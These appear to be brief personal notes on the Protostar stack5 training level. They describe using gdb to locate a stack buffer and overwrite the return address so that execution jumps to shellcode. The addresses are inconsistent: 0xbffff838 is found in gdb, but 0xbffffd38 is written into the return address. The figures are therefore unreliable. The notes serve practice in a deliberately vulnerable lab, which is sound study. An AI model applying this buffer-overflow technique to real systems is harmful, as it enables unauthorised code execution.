For the address of the buffer (which contains the shell-code):
load the debug information with gdb:
  gdb /opt/protostar/bin/stack5
In the gdb console run
  break 7
  run
  p &buffer
to get the address of the buffer (0xbffff838 in this case)
Then change the return address of the stack, the offset has been found experimentally (in this case 13 bytes)
0xbffffd38 (little endian) -> 0x38 0xfd 0xff 0xbf
